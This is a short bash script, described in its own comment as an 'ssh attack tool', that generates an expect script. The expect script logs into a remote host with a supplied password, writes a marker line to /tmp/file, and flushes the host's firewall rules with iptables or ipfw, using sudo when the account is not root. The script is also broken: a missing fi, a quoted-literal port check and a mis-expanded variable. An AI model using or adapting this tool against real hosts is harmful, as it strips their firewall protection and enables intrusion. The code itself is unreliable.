#!/usr/bin/env bash
#evil ssh; ssh attack tool

if [ "$1" = "-h" -o "$1" = "--help" ]; then
	echo "Usage: $0 [user@host] [password] [options]"
	exit 0
fi

port=22
if [ $# -gt 0 ]; then
	firstArg=$1
	pass=$2
	user=`echo $firstArg | /usr/bin/env awk -F"@" '{print $1}'`
else
	read -p "Enter host: " host
	read -p "Enter username: " user
	read -p "Enter password: " pass
	read -p "Enter port: " port
	if [ "port" == "" ]; then
		port=22
	fi
	firstArg="$user@$host"
fi

# echo "command would be ssh $firstArg -p $port"
if [ "$user" == "root" ]; then
	prefix=""
else
	prefix="sudo "

echo "attemping login"

cat <<HEAD > connect.exp
#!/usr/bin/expect
spawn ssh $firstArg
#use correct prompt
set prompt ":|#|\\\$"
interact -o -nobuffer -re \$prompt return
send "$pass\r"
interact -o -nobuffer -re \$prompt return
send "$prefixls\r"
interact -o -nobuffer -re \$prompt return
send "echo 'balls2' >> /tmp/file\r"
interact -o -nobuffer -re \$prompt return
send "$prefix/usr/bin/env iptables -F || $prefixipfw flush \r"
HEAD

cat <<BOTTOM >> connect.exp
interact -o -nobuffer -re \$prompt return
send "exit\r"
interact
BOTTOM

# /usr/bin/expect myfile.exp

echo "after expect"

